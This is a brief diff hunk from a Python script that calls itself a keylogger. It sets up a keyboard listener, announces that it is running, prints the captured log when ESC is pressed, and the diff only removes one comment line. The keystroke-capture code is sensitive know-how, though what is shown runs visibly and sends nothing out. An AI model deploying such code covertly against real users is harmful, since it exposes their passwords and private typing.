@@ -19,7 +19,7 @@ def on_release(key):
         print("[+] Final Log:", log)
         return False
 
-# Start listening to keystrokes
+
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     print("[+] Keylogger running... Press ESC to stop.")
     listener.join()
